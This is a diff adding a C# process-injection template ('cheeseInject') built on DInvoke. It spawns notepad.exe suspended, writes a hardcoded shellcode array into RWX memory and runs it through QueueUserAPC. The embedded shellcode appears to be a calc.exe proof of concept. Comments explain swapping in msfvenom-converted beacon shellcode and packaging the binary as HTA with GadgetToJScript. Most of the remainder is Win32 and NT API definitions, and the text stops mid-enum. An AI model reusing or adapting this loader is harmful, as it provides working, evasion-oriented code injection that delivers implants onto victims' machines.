@@ -1,0 +1,1194 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.InteropServices;
+
+//This template HEAVILY uses the work from TheRealWover's DInvoke
+//The code below is basically a combination of the 
+//proof-of-concept blogged by rastamouse and an injector from 3xpl01tc0d3r
+//https://rastamouse.me/blog/process-injection-dinvoke/
+//https://gist.github.com/3xpl01tc0d3r/ecf5e1ac09935c674a9c6939c694da13
+
+namespace cheeseInject
+{
+    public class Program
+    {
+        public Program()
+        {
+            Main();
+        }
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate bool CreateProcessA(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate uint ResumeThread(IntPtr hThread);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate bool CloseHandle(IntPtr hObject);
+
+        static IntPtr pCreateProcessA = Generic.GetLibraryAddress("kernel32.dll", "CreateProcessA");
+        static IntPtr pOpenProcess = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
+        static IntPtr pVirtualAllocEx = Generic.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
+        static IntPtr pWriteProcessMemory = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
+        static IntPtr pOpenThread = Generic.GetLibraryAddress("kernel32.dll", "OpenThread");
+        static IntPtr pQueueUserAPC = Generic.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
+        static IntPtr pResumeThread = Generic.GetLibraryAddress("kernel32.dll", "ResumeThread");
+        static IntPtr pCloseHandle = Generic.GetLibraryAddress("kernel32.dll", "CloseHandle");
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public uint dwProcessId;
+            public uint dwThreadId;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        //internal struct STARTUPINFO
+        public struct STARTUPINFO
+        {
+            uint cb;
+            IntPtr lpReserved;
+            IntPtr lpDesktop;
+            IntPtr lpTitle;
+            uint dwX;
+            uint dwY;
+            uint dwXSize;
+            uint dwYSize;
+            uint dwXCountChars;
+            uint dwYCountChars;
+            uint dwFillAttributes;
+            public uint dwFlags;
+            public ushort wShowWindow;
+            ushort cbReserved;
+            IntPtr lpReserved2;
+            IntPtr hStdInput;
+            IntPtr hStdOutput;
+            IntPtr hStdErr;
+        }
+
+        public enum ThreadAccess : int
+        {
+            TERMINATE = (0x0001),
+            SUSPEND_RESUME = (0x0002),
+            GET_CONTEXT = (0x0008),
+            SET_CONTEXT = (0x0010),
+            SET_INFORMATION = (0x0020),
+            QUERY_INFORMATION = (0x0040),
+            SET_THREAD_TOKEN = (0x0080),
+            IMPERSONATE = (0x0100),
+            DIRECT_IMPERSONATION = (0x0200),
+            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
+            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
+        }
+
+        public static PROCESS_INFORMATION StartProcess(string binaryPath)
+        {
+            uint flags = 0x00000004;
+
+            STARTUPINFO startInfo = new STARTUPINFO();
+            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
+            CreateProcessA createProcess = Marshal.GetDelegateForFunctionPointer(pCreateProcessA, typeof(CreateProcessA)) as CreateProcessA;
+            createProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);
+
+            return procInfo;
+        }
+        public static void Main()
+        {
+            OpenProcess openProcess = Marshal.GetDelegateForFunctionPointer(pOpenProcess, typeof(OpenProcess)) as OpenProcess;
+            VirtualAllocEx virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pVirtualAllocEx, typeof(VirtualAllocEx)) as VirtualAllocEx;
+            WriteProcessMemory writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pWriteProcessMemory, typeof(WriteProcessMemory)) as WriteProcessMemory;
+            OpenThread openThread = Marshal.GetDelegateForFunctionPointer(pOpenThread, typeof(OpenThread)) as OpenThread;
+            QueueUserAPC queueUserAPC = Marshal.GetDelegateForFunctionPointer(pQueueUserAPC, typeof(QueueUserAPC)) as QueueUserAPC;
+            ResumeThread resumeThread = Marshal.GetDelegateForFunctionPointer(pResumeThread, typeof(ResumeThread)) as ResumeThread;
+            CloseHandle closeHandle = Marshal.GetDelegateForFunctionPointer(pCloseHandle, typeof(CloseHandle)) as CloseHandle;
+
+
+            //Add the shellcode
+            //cat 64-stageless-beacon.bin | msfvenom -f csharp -a x64 --platform windows -o 64-stageless-beacon.cs
+            //cat 32-stageless-beacon.bin | msfvenom -f csharp -a x86 --platform windows -o 32-stageless-beacon.cs
+            //example -> byte[] shellcode = new byte[1000000] { <c# byte array of shellcode here> };
+            //Make sure the archetecture of the shellcode matches the archetecture of the binary you are targeting with OpenProcess() which is probs mshta.
+            //GadgetToJScript.exe -r -b -a .\this-filename.exe -w hta -o filename
+            var shellcode = new byte[195] { 0x89, 0xe5, 0x83, 0xec, 0x20, 0x31, 0xdb, 0x64, 0x8b, 0x5b, 0x30, 0x8b, 0x5b, 0x0c, 0x8b, 0x5b, 0x1c, 0x8b, 0x1b, 0x8b, 0x1b, 0x8b, 0x43, 0x08, 0x89, 0x45, 0xfc, 0x8b, 0x58, 0x3c, 0x01, 0xc3, 0x8b, 0x5b, 0x78, 0x01, 0xc3, 0x8b, 0x7b, 0x20, 0x01, 0xc7, 0x89, 0x7d, 0xf8, 0x8b, 0x4b, 0x24, 0x01, 0xc1, 0x89, 0x4d, 0xf4, 0x8b, 0x53, 0x1c, 0x01, 0xc2, 0x89, 0x55, 0xf0, 0x8b, 0x53, 0x14, 0x89, 0x55, 0xec, 0xeb, 0x32, 0x31, 0xc0, 0x8b, 0x55, 0xec, 0x8b, 0x7d, 0xf8, 0x8b, 0x75, 0x18, 0x31, 0xc9, 0xfc, 0x8b, 0x3c, 0x87, 0x03, 0x7d, 0xfc, 0x66, 0x83, 0xc1, 0x08, 0xf3, 0xa6, 0x74, 0x05, 0x40, 0x39, 0xd0, 0x72, 0xe4, 0x8b, 0x4d, 0xf4, 0x8b, 0x55, 0xf0, 0x66, 0x8b, 0x04, 0x41, 0x8b, 0x04, 0x82, 0x03, 0x45, 0xfc, 0xc3, 0xba, 0x78, 0x78, 0x65, 0x63, 0xc1, 0xea, 0x08, 0x52, 0x68, 0x57, 0x69, 0x6e, 0x45, 0x89, 0x65, 0x18, 0xe8, 0xb8, 0xff, 0xff, 0xff, 0x31, 0xc9, 0x51, 0x68, 0x2e, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x89, 0xe3, 0x41, 0x51, 0x53, 0xff, 0xd0, 0x31, 0xc9, 0xb9, 0x01, 0x65, 0x73, 0x73, 0xc1, 0xe9, 0x08, 0x51, 0x68, 0x50, 0x72, 0x6f, 0x63, 0x68, 0x45, 0x78, 0x69, 0x74, 0x89, 0x65, 0x18, 0xe8, 0x87, 0xff, 0xff, 0xff, 0x31, 0xd2, 0x52, 0xff, 0xd0 };
+            PROCESS_INFORMATION processInfo = StartProcess("C:/Windows/System32/notepad.exe");
+
+            IntPtr hProcess = openProcess(0x001F0FFF, false, (int)processInfo.dwProcessId);
+            IntPtr rMemAddress = virtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
+
+            if (writeProcessMemory(hProcess, rMemAddress, shellcode, (uint)shellcode.Length, out UIntPtr bytesWritten))
+            {
+                IntPtr tHandle = openThread(ThreadAccess.THREAD_ALL, false, (uint)processInfo.dwThreadId);
+                IntPtr ptr = queueUserAPC(rMemAddress, tHandle, IntPtr.Zero);
+                resumeThread(tHandle);
+            }
+
+            bool hOpenProcessClose = closeHandle(hProcess);
+
+        }
+    }
+
+    public static class Win32
+    {
+        public class WinNT
+        {
+            public const UInt32 PAGE_NOACCESS = 0x01;
+            public const UInt32 PAGE_READONLY = 0x02;
+            public const UInt32 PAGE_READWRITE = 0x04;
+            public const UInt32 PAGE_WRITECOPY = 0x08;
+            public const UInt32 PAGE_EXECUTE = 0x10;
+            public const UInt32 PAGE_EXECUTE_READ = 0x20;
+            public const UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+            public const UInt32 PAGE_EXECUTE_WRITECOPY = 0x80;
+            public const UInt32 PAGE_GUARD = 0x100;
+            public const UInt32 PAGE_NOCACHE = 0x200;
+            public const UInt32 PAGE_WRITECOMBINE = 0x400;
+            public const UInt32 PAGE_TARGETS_INVALID = 0x40000000;
+            public const UInt32 PAGE_TARGETS_NO_UPDATE = 0x40000000;
+
+            public const UInt32 SEC_COMMIT = 0x08000000;
+            public const UInt32 SEC_IMAGE = 0x1000000;
+            public const UInt32 SEC_IMAGE_NO_EXECUTE = 0x11000000;
+            public const UInt32 SEC_LARGE_PAGES = 0x80000000;
+            public const UInt32 SEC_NOCACHE = 0x10000000;
+            public const UInt32 SEC_RESERVE = 0x4000000;
+            public const UInt32 SEC_WRITECOMBINE = 0x40000000;
+
+            public const UInt32 SE_PRIVILEGE_ENABLED = 0x2;
+            public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1;
+            public const UInt32 SE_PRIVILEGE_REMOVED = 0x4;
+            public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x3;
+
+            public const UInt64 SE_GROUP_ENABLED = 0x00000004L;
+            public const UInt64 SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002L;
+            public const UInt64 SE_GROUP_INTEGRITY = 0x00000020L;
+            public const UInt32 SE_GROUP_INTEGRITY_32 = 0x00000020;
+            public const UInt64 SE_GROUP_INTEGRITY_ENABLED = 0x00000040L;
+            public const UInt64 SE_GROUP_LOGON_ID = 0xC0000000L;
+            public const UInt64 SE_GROUP_MANDATORY = 0x00000001L;
+            public const UInt64 SE_GROUP_OWNER = 0x00000008L;
+            public const UInt64 SE_GROUP_RESOURCE = 0x20000000L;
+            public const UInt64 SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010L;
+
+            // http://www.pinvoke.net/default.aspx/Enums.ACCESS_MASK
+            [Flags]
+            public enum ACCESS_MASK : uint
+            {
+                DELETE = 0x00010000,
+                READ_CONTROL = 0x00020000,
+                WRITE_DAC = 0x00040000,
+                WRITE_OWNER = 0x00080000,
+                SYNCHRONIZE = 0x00100000,
+                STANDARD_RIGHTS_REQUIRED = 0x000F0000,
+                STANDARD_RIGHTS_READ = 0x00020000,
+                STANDARD_RIGHTS_WRITE = 0x00020000,
+                STANDARD_RIGHTS_EXECUTE = 0x00020000,
+                STANDARD_RIGHTS_ALL = 0x001F0000,
+                SPECIFIC_RIGHTS_ALL = 0x0000FFF,
+                ACCESS_SYSTEM_SECURITY = 0x01000000,
+                MAXIMUM_ALLOWED = 0x02000000,
+                GENERIC_READ = 0x80000000,
+                GENERIC_WRITE = 0x40000000,
+                GENERIC_EXECUTE = 0x20000000,
+                GENERIC_ALL = 0x10000000,
+                DESKTOP_READOBJECTS = 0x00000001,
+                DESKTOP_CREATEWINDOW = 0x00000002,
+                DESKTOP_CREATEMENU = 0x00000004,
+                DESKTOP_HOOKCONTROL = 0x00000008,
+                DESKTOP_JOURNALRECORD = 0x00000010,
+                DESKTOP_JOURNALPLAYBACK = 0x00000020,
+                DESKTOP_ENUMERATE = 0x00000040,
+                DESKTOP_WRITEOBJECTS = 0x00000080,
+                DESKTOP_SWITCHDESKTOP = 0x00000100,
+                WINSTA_ENUMDESKTOPS = 0x00000001,
+                WINSTA_READATTRIBUTES = 0x00000002,
+                WINSTA_ACCESSCLIPBOARD = 0x00000004,
+                WINSTA_CREATEDESKTOP = 0x00000008,
+                WINSTA_WRITEATTRIBUTES = 0x00000010,
+                WINSTA_ACCESSGLOBALATOMS = 0x00000020,
+                WINSTA_EXITWINDOWS = 0x00000040,
+                WINSTA_ENUMERATE = 0x00000100,
+                WINSTA_READSCREEN = 0x00000200,
+                WINSTA_ALL_ACCESS = 0x0000037F,
+
+                SECTION_ALL_ACCESS = 0x10000000,
+                SECTION_QUERY = 0x0001,
+                SECTION_MAP_WRITE = 0x0002,
+                SECTION_MAP_READ = 0x0004,
+                SECTION_MAP_EXECUTE = 0x0008,
+                SECTION_EXTEND_SIZE = 0x0010
+            };
+        }
+
+        public static class Kernel32
+        {
+            public static uint MEM_COMMIT = 0x1000;
+            public static uint MEM_RESERVE = 0x2000;
+            public static uint MEM_RESET = 0x80000;
+            public static uint MEM_RESET_UNDO = 0x1000000;
+            public static uint MEM_LARGE_PAGES = 0x20000000;
+            public static uint MEM_PHYSICAL = 0x400000;
+            public static uint MEM_TOP_DOWN = 0x100000;
+            public static uint MEM_WRITE_WATCH = 0x200000;
+            public static uint MEM_COALESCE_PLACEHOLDERS = 0x1;
+            public static uint MEM_PRESERVE_PLACEHOLDER = 0x2;
+            public static uint MEM_DECOMMIT = 0x4000;
+            public static uint MEM_RELEASE = 0x8000;
+
+            [Flags]
+            public enum ProcessAccessFlags : UInt32
+            {
+                // https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396
+                PROCESS_ALL_ACCESS = 0x001F0FFF,
+                PROCESS_CREATE_PROCESS = 0x0080,
+                PROCESS_CREATE_THREAD = 0x0002,
+                PROCESS_DUP_HANDLE = 0x0040,
+                PROCESS_QUERY_INFORMATION = 0x0400,
+                PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
+                PROCESS_SET_INFORMATION = 0x0200,
+                PROCESS_SET_QUOTA = 0x0100,
+                PROCESS_SUSPEND_RESUME = 0x0800,
+                PROCESS_TERMINATE = 0x0001,
+                PROCESS_VM_OPERATION = 0x0008,
+                PROCESS_VM_READ = 0x0010,
+                PROCESS_VM_WRITE = 0x0020,
+                SYNCHRONIZE = 0x00100000
+            }
+
+            [Flags]
+            public enum FileAccessFlags : UInt32
+            {
+                DELETE = 0x10000,
+                FILE_READ_DATA = 0x1,
+                FILE_READ_ATTRIBUTES = 0x80,
+                FILE_READ_EA = 0x8,
+                READ_CONTROL = 0x20000,
+                FILE_WRITE_DATA = 0x2,
+                FILE_WRITE_ATTRIBUTES = 0x100,
+                FILE_WRITE_EA = 0x10,
+                FILE_APPEND_DATA = 0x4,
+                WRITE_DAC = 0x40000,
+                WRITE_OWNER = 0x80000,
+                SYNCHRONIZE = 0x100000,
+                FILE_EXECUTE = 0x20
+            }
+
+            [Flags]
+            public enum FileShareFlags : UInt32
+            {
+                FILE_SHARE_NONE = 0x0,
+                FILE_SHARE_READ = 0x1,
+                FILE_SHARE_WRITE = 0x2,
+                FILE_SHARE_DELETE = 0x4
+            }
+
+            [Flags]
+            public enum FileOpenFlags : UInt32
+            {
+                FILE_DIRECTORY_FILE = 0x1,
+                FILE_WRITE_THROUGH = 0x2,
+                FILE_SEQUENTIAL_ONLY = 0x4,
+                FILE_NO_INTERMEDIATE_BUFFERING = 0x8,
+                FILE_SYNCHRONOUS_IO_ALERT = 0x10,
+                FILE_SYNCHRONOUS_IO_NONALERT = 0x20,
+                FILE_NON_DIRECTORY_FILE = 0x40,
+                FILE_CREATE_TREE_CONNECTION = 0x80,
+                FILE_COMPLETE_IF_OPLOCKED = 0x100,
+                FILE_NO_EA_KNOWLEDGE = 0x200,
+                FILE_OPEN_FOR_RECOVERY = 0x400,
+                FILE_RANDOM_ACCESS = 0x800,
+                FILE_DELETE_ON_CLOSE = 0x1000,
+                FILE_OPEN_BY_FILE_ID = 0x2000,
+                FILE_OPEN_FOR_BACKUP_INTENT = 0x4000,
+                FILE_NO_COMPRESSION = 0x8000
+            }
+
+            [Flags]
+            public enum StandardRights : uint
+            {
+                Delete = 0x00010000,
+                ReadControl = 0x00020000,
+                WriteDac = 0x00040000,
+                WriteOwner = 0x00080000,
+                Synchronize = 0x00100000,
+                Required = 0x000f0000,
+                Read = ReadControl,
+                Write = ReadControl,
+                Execute = ReadControl,
+                All = 0x001f0000,
+
+                SpecificRightsAll = 0x0000ffff,
+                AccessSystemSecurity = 0x01000000,
+                MaximumAllowed = 0x02000000,
+                GenericRead = 0x80000000,
+                GenericWrite = 0x40000000,
+                GenericExecute = 0x20000000,
+                GenericAll = 0x10000000
+            }
+
+            [Flags]
+            public enum ThreadAccess : uint
+            {
+                Terminate = 0x0001,
+                SuspendResume = 0x0002,
+                Alert = 0x0004,
+                GetContext = 0x0008,
+                SetContext = 0x0010,
+                SetInformation = 0x0020,
+                QueryInformation = 0x0040,
+                SetThreadToken = 0x0080,
+                Impersonate = 0x0100,
+                DirectImpersonation = 0x0200,
+                SetLimitedInformation = 0x0400,
+                QueryLimitedInformation = 0x0800,
+                All = StandardRights.Required | StandardRights.Synchronize | 0x3ff
+            }
+        }
+
+    }
+
+    public class Native
+    {
+
+        public static void RtlInitUnicodeString(ref Native.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
+        {
+            // Craft an array for the arguments
+            object[] funcargs =
+            {
+                DestinationString, SourceString
+            };
+
+            Generic.DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);
+
+            // Update the modified variables
+            DestinationString = (Native.UNICODE_STRING)funcargs[0];
+        }
+
+        public static Native.NTSTATUS LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref Native.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
+        {
+            // Craft an array for the arguments
+            object[] funcargs =
+            {
+                PathToFile, dwFlags, ModuleFileName, ModuleHandle
+            };
+
+            Native.NTSTATUS retValue = (Native.NTSTATUS)Generic.DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.LdrLoadDll), ref funcargs);
+
+            // Update the modified variables
+            ModuleHandle = (IntPtr)funcargs[3];
+
+            return retValue;
+        }
+
+        public struct DELEGATES
+        {
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate Native.NTSTATUS NtCreateThreadEx(
+                out IntPtr threadHandle,
+                Win32.WinNT.ACCESS_MASK desiredAccess,
+                IntPtr objectAttributes,
+                IntPtr processHandle,
+                IntPtr startAddress,
+                IntPtr parameter,
+                bool createSuspended,
+                int stackZeroBits,
+                int sizeOfStack,
+                int maximumStackSize,
+                IntPtr attributeList);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate Native.NTSTATUS RtlCreateUserThread(
+                IntPtr Process,
+                IntPtr ThreadSecurityDescriptor,
+                bool CreateSuspended,
+                IntPtr ZeroBits,
+                IntPtr MaximumStackSize,
+                IntPtr CommittedStackSize,
+                IntPtr StartAddress,
+                IntPtr Parameter,
+                ref IntPtr Thread,
+                IntPtr ClientId);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate Native.NTSTATUS NtCreateSection(
+                ref IntPtr SectionHandle,
+                uint DesiredAccess,
+                IntPtr ObjectAttributes,
+                ref ulong MaximumSize,
+                uint SectionPageProtection,
+                uint AllocationAttributes,
+                IntPtr FileHandle);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate Native.NTSTATUS NtUnmapViewOfSection(
+                IntPtr hProc,
+                IntPtr baseAddr);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate Native.NTSTATUS NtMapViewOfSection(
+                IntPtr SectionHandle,
+                IntPtr ProcessHandle,
+                out IntPtr BaseAddress,
+                IntPtr ZeroBits,
+                IntPtr CommitSize,
+                IntPtr SectionOffset,
+                out ulong ViewSize,
+                uint InheritDisposition,
+                uint AllocationType,
+                uint Win32Protect);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 LdrLoadDll(
+                IntPtr PathToFile,
+                UInt32 dwFlags,
+                ref Native.UNICODE_STRING ModuleFileName,
+                ref IntPtr ModuleHandle);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate void RtlInitUnicodeString(
+                ref Native.UNICODE_STRING DestinationString,
+                [MarshalAs(UnmanagedType.LPWStr)]
+                string SourceString);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate void RtlZeroMemory(
+                IntPtr Destination,
+                int length);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 NtQueryInformationProcess(
+                IntPtr processHandle,
+                Native.PROCESSINFOCLASS processInformationClass,
+                IntPtr processInformation,
+                int processInformationLength,
+                ref UInt32 returnLength);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 NtOpenProcess(
+                ref IntPtr ProcessHandle,
+                Win32.Kernel32.ProcessAccessFlags DesiredAccess,
+                ref Native.OBJECT_ATTRIBUTES ObjectAttributes,
+                ref Native.CLIENT_ID ClientId);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 NtQueueApcThread(
+                IntPtr ThreadHandle,
+                IntPtr ApcRoutine,
+                IntPtr ApcArgument1,
+                IntPtr ApcArgument2,
+                IntPtr ApcArgument3);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 NtOpenThread(
+                ref IntPtr ThreadHandle,
+                Win32.Kernel32.ThreadAccess DesiredAccess,
+                ref Native.OBJECT_ATTRIBUTES ObjectAttributes,
+                ref Native.CLIENT_ID ClientId);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 NtAllocateVirtualMemory(
+                IntPtr ProcessHandle,
+                ref IntPtr BaseAddress,
+                IntPtr ZeroBits,
+                ref IntPtr RegionSize,
+                UInt32 AllocationType,
+                UInt32 Protect);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 NtFreeVirtualMemory(
+                IntPtr ProcessHandle,
+                ref IntPtr BaseAddress,
+                ref IntPtr RegionSize,
+                UInt32 FreeType);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 NtQueryVirtualMemory(
+                IntPtr ProcessHandle,
+                IntPtr BaseAddress,
+                Native.MEMORYINFOCLASS MemoryInformationClass,
+                IntPtr MemoryInformation,
+                UInt32 MemoryInformationLength,
+                ref UInt32 ReturnLength);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 NtProtectVirtualMemory(
+                IntPtr ProcessHandle,
+                ref IntPtr BaseAddress,
+                ref IntPtr RegionSize,
+                UInt32 NewProtect,
+                ref UInt32 OldProtect);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 NtWriteVirtualMemory(
+                IntPtr ProcessHandle,
+                IntPtr BaseAddress,
+                IntPtr Buffer,
+                UInt32 BufferLength,
+                ref UInt32 BytesWritten);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 RtlUnicodeStringToAnsiString(
+                ref Native.ANSI_STRING DestinationString,
+                ref Native.UNICODE_STRING SourceString,
+                bool AllocateDestinationString);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 LdrGetProcedureAddress(
+                IntPtr hModule,
+                IntPtr FunctionName,
+                IntPtr Ordinal,
+                ref IntPtr FunctionAddress);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 RtlGetVersion(
+                ref Native.OSVERSIONINFOEX VersionInformation);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 NtReadVirtualMemory(
+                IntPtr ProcessHandle,
+                IntPtr BaseAddress,
+                IntPtr Buffer,
+                UInt32 NumberOfBytesToRead,
+                ref UInt32 NumberOfBytesRead);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate UInt32 NtOpenFile(
+                ref IntPtr FileHandle,
+                Win32.Kernel32.FileAccessFlags DesiredAccess,
+                ref Native.OBJECT_ATTRIBUTES ObjAttr,
+                ref Native.IO_STATUS_BLOCK IoStatusBlock,
+                Win32.Kernel32.FileShareFlags ShareAccess,
+                Win32.Kernel32.FileOpenFlags OpenOptions);
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct UNICODE_STRING
+        {
+            public UInt16 Length;
+            public UInt16 MaximumLength;
+            public IntPtr Buffer;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct ANSI_STRING
+        {
+            public UInt16 Length;
+            public UInt16 MaximumLength;
+            public IntPtr Buffer;
+        }
+
+        public struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr ExitStatus;
+            public IntPtr PebBaseAddress;
+            public IntPtr AffinityMask;
+            public IntPtr BasePriority;
+            public UIntPtr UniqueProcessId;
+            public int InheritedFromUniqueProcessId;
+
+            public int Size
+            {
+                get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
+            }
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 0)]
+        public struct OBJECT_ATTRIBUTES
+        {
+            public Int32 Length;
+            public IntPtr RootDirectory;
+            public IntPtr ObjectName; // -> UNICODE_STRING
+            public uint Attributes;
+            public IntPtr SecurityDescriptor;
+            public IntPtr SecurityQualityOfService;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct IO_STATUS_BLOCK
+        {
+            public IntPtr Status;
+            public IntPtr Information;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct CLIENT_ID
+        {
+            public IntPtr UniqueProcess;
+            public IntPtr UniqueThread;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct OSVERSIONINFOEX
+        {
+            public uint OSVersionInfoSize;
+            public uint MajorVersion;
+            public uint MinorVersion;
+            public uint BuildNumber;
+            public uint PlatformId;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
+            public string CSDVersion;
+            public ushort ServicePackMajor;
+            public ushort ServicePackMinor;
+            public ushort SuiteMask;
+            public byte ProductType;
+            public byte Reserved;
+        }
+
+        public enum MEMORYINFOCLASS : int
+        {
+            MemoryBasicInformation = 0,
+            MemoryWorkingSetList,
+            MemorySectionName,
+            MemoryBasicVlmInformation
+        }
+
+        public enum PROCESSINFOCLASS : int
+        {
+            ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
+            ProcessQuotaLimits, // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX
+            ProcessIoCounters, // q: IO_COUNTERS
+            ProcessVmCounters, // q: VM_COUNTERS, VM_COUNTERS_EX
+            ProcessTimes, // q: KERNEL_USER_TIMES
+            ProcessBasePriority, // s: KPRIORITY
+            ProcessRaisePriority, // s: ULONG
+            ProcessDebugPort, // q: HANDLE
+            ProcessExceptionPort, // s: HANDLE
+            ProcessAccessToken, // s: PROCESS_ACCESS_TOKEN
+            ProcessLdtInformation, // 10
+            ProcessLdtSize,
+            ProcessDefaultHardErrorMode, // qs: ULONG
+            ProcessIoPortHandlers, // (kernel-mode only)
+            ProcessPooledUsageAndLimits, // q: POOLED_USAGE_AND_LIMITS
+            ProcessWorkingSetWatch, // q: PROCESS_WS_WATCH_INFORMATION[]; s: void
+            ProcessUserModeIOPL,
+            ProcessEnableAlignmentFaultFixup, // s: BOOLEAN
+            ProcessPriorityClass, // qs: PROCESS_PRIORITY_CLASS
+            ProcessWx86Information,
+            ProcessHandleCount, // 20, q: ULONG, PROCESS_HANDLE_INFORMATION
+            ProcessAffinityMask, // s: KAFFINITY
+            ProcessPriorityBoost, // qs: ULONG
+            ProcessDeviceMap, // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX
+            ProcessSessionInformation, // q: PROCESS_SESSION_INFORMATION
+            ProcessForegroundInformation, // s: PROCESS_FOREGROUND_BACKGROUND
+            ProcessWow64Information, // q: ULONG_PTR
+            ProcessImageFileName, // q: UNICODE_STRING
+            ProcessLUIDDeviceMapsEnabled, // q: ULONG
+            ProcessBreakOnTermination, // qs: ULONG
+            ProcessDebugObjectHandle, // 30, q: HANDLE
+            ProcessDebugFlags, // qs: ULONG
+            ProcessHandleTracing, // q: PROCESS_HANDLE_TRACING_QUERY; s: size 0 disables, otherwise enables
+            ProcessIoPriority, // qs: ULONG
+            ProcessExecuteFlags, // qs: ULONG
+            ProcessResourceManagement,
